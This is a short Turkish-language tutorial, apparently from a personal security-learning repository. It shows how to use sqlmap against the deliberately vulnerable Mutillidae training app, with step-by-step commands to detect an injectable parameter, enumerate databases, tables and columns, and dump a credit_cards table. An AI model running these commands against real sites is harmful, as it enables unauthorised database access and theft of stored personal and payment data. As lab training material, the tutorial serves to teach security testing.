# SQL Map 
### ```URL``` adresini verdiğimiz sitede SQL açığı var mı test eder
#### 1.``` sqlmap -u "http://123.123.123.123/mutillidae/index.php?&username=admin&password=123123&user-info-php-submit-button=View+Account+Details"```
#### 2. Bize eğer ```Get parameter 'username' is vulnerable. Do you want to keep testing the others (if any) Y/N``` derse "açık bulundu teste devam edeyim mi?" diye soruyordur
![](https://github.com/ahmetnuysal/Cyber-Security/blob/bf3a19821795b78ca5fed16e82ad334859214ecc/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2017.40.21.jpeg)
#### 3. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --current-db``` Güncel database'leri verir
![](https://github.com/ahmetnuysal/Cyber-Security/blob/c5a212ed129be0d8418261b677042d9c5e504e6d/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2017.47.09.jpeg)
#### 4. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --tables -D owasp10``` owasp10 içindeki tüm table'lları gösterir
![](https://github.com/ahmetnuysal/Cyber-Security/blob/83e78aeb040296afd4cb7b83cab56a7ddc988b92/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.29.34.jpeg)
#### 5. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --columns -T <tableismi> -D <databaseismi>``` Sütunları görmemizi sağlar
![](https://github.com/ahmetnuysal/Cyber-Security/blob/e2b4b92b35c22b60c442741dfc83a30892a2ae9f/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.32.11.jpeg)
#### 6. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" -T credit_cards -D owasp10 --dump``` Table içindeki verileri gösterir
![](https://github.com/ahmetnuysal/Cyber-Security/blob/d326716448fe5caa031175c9d6ac65a8dc08b1fb/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.34.27.jpeg)




